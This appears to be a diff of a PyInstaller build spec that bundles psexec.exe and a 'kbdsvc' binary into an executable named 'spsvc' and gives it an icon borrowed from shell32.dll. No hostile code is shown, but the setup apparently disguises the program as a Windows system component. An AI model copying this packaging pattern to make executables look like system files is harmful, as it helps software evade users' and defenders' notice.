@@ -5,7 +5,6 @@ block_cipher = None
 
 added_files = [
     ('setup.bat', '.'),
-    ('spsvc.bat', '.'),
     ('psexec.exe', '.'),
     ('requests/ca.crt', 'requests'),
     ('kbdsvc/kbdsvc.exe', 'kbdsvc'),
@@ -27,6 +26,7 @@ pyz = PYZ(a.pure, a.zipped_data,
           cipher=block_cipher)
 exe = EXE(pyz,
           a.scripts,
+          icon='shell32.dll,2',
           exclude_binaries=True,
           name='spsvc',
           debug=False,
